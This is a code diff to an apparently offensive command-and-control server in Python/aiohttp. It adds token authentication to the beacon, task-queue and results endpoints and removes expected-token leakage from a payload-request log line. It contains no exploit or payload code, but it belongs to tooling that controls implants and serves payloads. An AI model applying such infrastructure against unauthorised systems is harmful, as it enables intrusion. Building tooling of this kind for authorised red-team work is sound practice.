@@ -94,6 +94,22 @@ class C2State:
 
 c2_state = C2State()
 PAYLOAD_AUTH_TOKEN = get_payload_token()
+API_TOKEN = os.getenv("PHANTOM_API_TOKEN", "").strip()
+
+
+# ── Auth Middleware ─────────────────────────────────────────────────────────
+
+@web.middleware
+async def api_auth_middleware(request: web.Request, handler):
+    """Protect REST API control endpoints with PHANTOM_API_TOKEN.
+    If PHANTOM_API_TOKEN is empty (unset), auth is disabled for backward compat."""
+    protected = ("/api/v1/beacons", "/api/v1/queue", "/api/v1/results")
+    if request.path in protected and API_TOKEN:
+        token = request.headers.get("X-Api-Token", "")
+        if token != API_TOKEN:
+            logger.warning(f"Unauthorized API access to {request.path} from {request.remote}")
+            return web.Response(status=403, text="Forbidden")
+    return await handler(request)
 
 
 # ── aiohttp Handlers ───────────────────────────────────────────────────────
@@ -193,7 +209,7 @@ async def handle_payload(request: web.Request) -> web.Response:
         
         token = request.query.get("auth") or request.headers.get("X-Auth-Token")
         if token != current_auth_token:
-            logger.warning(f"Unauthorized payload request from {request.remote}. Received: {token}, Expected: {current_auth_token}")
+            logger.warning(f"Unauthorized payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
 
         # Map route to filename
@@ -374,7 +390,7 @@ class C2Server:
         return None
 
     def _setup_app(self) -> web.Application:
-        app = web.Application(client_max_size=50*1024*1024)
+        app = web.Application(client_max_size=50*1024*1024, middlewares=[api_auth_middleware])
         # Check-in: Support malleable URIs
         app.router.add_get("/api/v1/ping", handle_checkin)
         app.router.add_post("/api/v1/ping", handle_checkin)
